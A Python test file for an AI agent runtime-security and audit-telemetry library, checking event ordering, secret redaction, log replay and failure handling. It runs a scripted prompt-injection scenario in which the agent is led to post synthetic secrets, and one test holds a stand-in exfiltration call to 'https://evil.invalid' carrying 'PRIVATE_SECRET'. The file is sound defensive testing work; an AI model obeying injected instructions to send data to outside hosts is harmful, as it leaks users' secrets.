import json

import pytest
from langchain_core.messages import AIMessage
from test_agent_core import call, make_agent

from runtime_security.contracts import AgentRequest, ToolCallEvent, ToolResponse
from runtime_security.gateway.interceptor import observe_call
from runtime_security.scenarios import INJECTION, ScenarioRunner
from runtime_security.scenarios.lab import run_scenario
from runtime_security.telemetry.events import RunMetadata
from runtime_security.telemetry.recorder import (
    InMemoryRecorder,
    JsonlRecorder,
    TelemetryError,
    read_events,
)
from runtime_security.telemetry.replay import main as replay
from runtime_security.tools import SandboxToolRegistry


def test_runtime_order_metadata_and_redaction():
    recorder = InMemoryRecorder()
    result = run_scenario(INJECTION, recorder=recorder)
    events = recorder.for_run(result.agent_result.run_id)
    assert [e.kind for e in events] == ["run_start"] + [
        "proposal",
        "decision",
        "tool_result",
    ] * 3 + ["run_complete"]
    assert [e.sequence for e in events] == list(range(1, 12))
    assert len({e.event_id for e in events}) == 11
    assert all(e.timestamp.tzinfo is not None for e in events)
    assert all(e.metadata.scenario_id == INJECTION.scenario_id for e in events)
    assert all(e.metadata.model_name == "deterministic-scripted" for e in events)
    assert events[4].summary["resource_sensitivity"] == "synthetic_sensitive"
    assert "SYNTHETIC_SECRET_ATLAS_123" not in recorder.export_run(result.agent_result.run_id)
    assert events[7].arguments["payload"]["redacted"]
    assert result.attack_completed  # Monitoring does not change the scenario outcome.


def test_preexecution_capture_and_failed_tool_summary():
    recorder = InMemoryRecorder()
    recorder.start_run("r", RunMetadata(max_steps=2))
    event = ToolCallEvent(
        run_id="r", call_id="c", tool_name="read_file", arguments={"file_id": "sensitive.txt"}
    )

    def fail(call):
        assert [e.kind for e in recorder.for_run("r")] == ["run_start", "proposal", "decision"]
        raise ValueError("secret text in tool exception")

    result = observe_call(event, fail, recorder)
    assert result.status == "error"
    assert result.call_id == "c"
    assert "secret text" not in recorder.export_run("r")
    assert recorder.for_run("r")[-1].summary["status"] == "error"


def test_run_isolation_and_snapshot_copy():
    recorder = InMemoryRecorder()
    first = run_scenario(INJECTION, recorder=recorder)
    second = run_scenario(INJECTION, recorder=recorder)
    a, b = first.agent_result.run_id, second.agent_result.run_id
    assert a != b
    assert all(e.run_id == a for e in recorder.for_run(a))
    assert recorder.for_run(b)[0].sequence == 1
    snapshot = recorder.for_run(a)
    snapshot[0].metadata.model_name = "changed"
    assert recorder.for_run(a)[0].metadata.model_name == "deterministic-scripted"
    with pytest.raises(TelemetryError):
        recorder.start_run(a, RunMetadata(max_steps=1))


def test_jsonl_append_restart_and_replay(tmp_path, capsys):
    path = tmp_path / "audit.jsonl"
    recorder = JsonlRecorder(path)
    first = run_scenario(INJECTION, recorder=recorder)
    original = path.read_bytes()
    reopened = JsonlRecorder(path)
    second = run_scenario(INJECTION, recorder=reopened)
    assert path.read_bytes().startswith(original)
    events = read_events(path)
    assert len(events) == 22
    assert replay([str(path), first.agent_result.run_id]) == 0
    printed = [json.loads(line) for line in capsys.readouterr().out.splitlines()]
    assert [e["sequence"] for e in printed] == list(range(1, 12))
    assert all(e["run_id"] != second.agent_result.run_id for e in printed)
    with pytest.raises(TelemetryError):
        reopened.start_run(first.agent_result.run_id, RunMetadata(max_steps=1))


def test_replay_rejects_truncated_or_duplicate_logs(tmp_path):
    path = tmp_path / "broken.jsonl"
    path.write_text('{"run_id":', encoding="utf-8")
    with pytest.raises(ValueError):
        JsonlRecorder(path)
    recorder = InMemoryRecorder()
    recorder.start_run("r", RunMetadata(max_steps=1))
    line = recorder.export_run("r")
    path.write_text(line + line, encoding="utf-8")
    with pytest.raises(ValueError):
        read_events(path)


@pytest.mark.parametrize("fail_kind,executions", [("proposal", 0), ("tool_result", 1)])
def test_recorder_failure_surfaces_without_reexecution(fail_kind, executions):
    class BrokenRecorder(InMemoryRecorder):
        def _persist(self, event):
            if event.kind == fail_kind:
                raise OSError("disk unavailable")

    recorder = BrokenRecorder()
    recorder.start_run("r", RunMetadata(max_steps=1))
    effects = []

    def execute(call):
        effects.append("mock effect")
        return ToolResponse(call_id=call.call_id, status="success", output="private data")

    with pytest.raises(TelemetryError):
        observe_call(
            ToolCallEvent(run_id="r", call_id="c", tool_name="mock_http_post"), execute, recorder
        )
    assert len(effects) == executions
    assert not any(e.kind == "tool_result" for e in recorder.for_run("r"))


def test_langgraph_scenario_context_and_provider_error():
    registry = SandboxToolRegistry()
    agent, _ = make_agent(
        [call(args={"document_id": "injection.txt"}), RuntimeError("private")], registry
    )
    result = ScenarioRunner(agent, lambda: registry.recorded_requests).run(
        INJECTION, "provider-run", model_name="fake-model"
    )
    events = agent.recorder.for_run("provider-run")
    assert result.outcome == "error"
    assert events[-1].summary["status"] == "provider_error"
    assert events[1].metadata.model_name == "fake-model"
    assert "private" not in agent.recorder.export_run("provider-run")


def test_malformed_provider_call_is_recorded_safely_without_execution():
    raw_payload = '{"destination":"https://evil.invalid","payload":"PRIVATE_SECRET"}'
    malformed = AIMessage(
        content="",
        invalid_tool_calls=[
            {
                "name": "mock_http_post",
                "args": raw_payload,
                "id": "private-call-id",
                "error": "invalid arguments",
            }
        ],
    )
    registry = SandboxToolRegistry()
    agent, _ = make_agent([malformed], registry)

    result = agent.invoke(AgentRequest(run_id="malformed", prompt="run"))
    events = agent.recorder.for_run("malformed")
    export = agent.recorder.export_run("malformed")

    assert result.final_answer == "The model provider failed to complete this request."
    assert [event.kind for event in events] == [
        "run_start",
        "proposal",
        "decision",
        "tool_result",
        "run_complete",
    ]
    assert events[1].tool_name == "mock_http_post"
    assert events[1].arguments["malformed"]["redacted"]
    assert events[3].summary["execution"] == "not_started"
    assert "PRIVATE_SECRET" not in export
    assert "private-call-id" not in export
    assert not registry.recorded_requests


def test_unknown_arguments_and_destinations_are_redacted():
    recorder = InMemoryRecorder()
    recorder.start_run("r", RunMetadata(max_steps=1))
    event = ToolCallEvent(
        run_id="r",
        call_id="c",
        tool_name="mock_http_post",
        arguments={
            "destination": "https://host.invalid/SECRET",
            "payload": {"nested": "SECRET"},
            "SECRET_KEY": "SECRET",
        },
    )
    observe_call(
        event,
        lambda c: ToolResponse(call_id=c.call_id, status="success", output={"SECRET": "SECRET"}),
        recorder,
    )
    assert "SECRET" not in recorder.export_run("r")


def test_agent_budget_and_context_reset():
    agent, _ = make_agent([call()])
    result = agent.invoke(AgentRequest(run_id="budget", prompt="go", max_steps=1))
    assert result.final_answer == "Maximum agent steps reached."
    events = agent.recorder.for_run("budget")
    assert events[0].metadata.scenario_id is None
    assert events[-1].summary == {"status": "step_limit", "steps": 1}


def test_replay_rejects_missing_decision(tmp_path):
    recorder = InMemoryRecorder()
    result = run_scenario(INJECTION, recorder=recorder)
    events = recorder.for_run(result.agent_result.run_id)
    events = [event for event in events if event.kind != "decision"]
    # Even with renumbered events, an omitted decision must be rejected.
    for index, event in enumerate(events, 1):
        event.sequence = index
    path = tmp_path / "missing-decision.jsonl"
    path.write_text("".join(e.model_dump_json() + "\n" for e in events), encoding="utf-8")
    with pytest.raises(ValueError, match="lifecycle"):
        read_events(path)


def test_scenario_surfaces_post_effect_logging_failure():
    class BrokenRecorder(InMemoryRecorder):
        def _persist(self, event):
            if event.kind == "tool_result" and event.tool_name == "mock_http_post":
                raise OSError("audit unavailable")

    recorder = BrokenRecorder()
    result = run_scenario(INJECTION, recorder=recorder)
    assert result.outcome == "error"
    assert len(result.recorded_side_effects) == 1
    assert "Audit write failed" in result.notes


def test_concurrent_runs_keep_independent_sequences():
    from concurrent.futures import ThreadPoolExecutor

    recorder = InMemoryRecorder()
    with ThreadPoolExecutor(max_workers=2) as pool:
        results = list(pool.map(lambda _: run_scenario(INJECTION, recorder=recorder), range(2)))
    for result in results:
        events = recorder.for_run(result.agent_result.run_id)
        assert [e.sequence for e in events] == list(range(1, 12))
        assert events[-1].kind == "run_complete"


def test_langgraph_does_not_swallow_recorder_failure():
    class BrokenRecorder(InMemoryRecorder):
        def _persist(self, event):
            if event.kind == "proposal":
                raise OSError("disk unavailable")

    agent, model = make_agent([call()])
    agent.recorder = BrokenRecorder()
    with pytest.raises(TelemetryError):
        agent.invoke(AgentRequest(run_id="broken", prompt="go"))
    assert model.invoke.call_count == 1
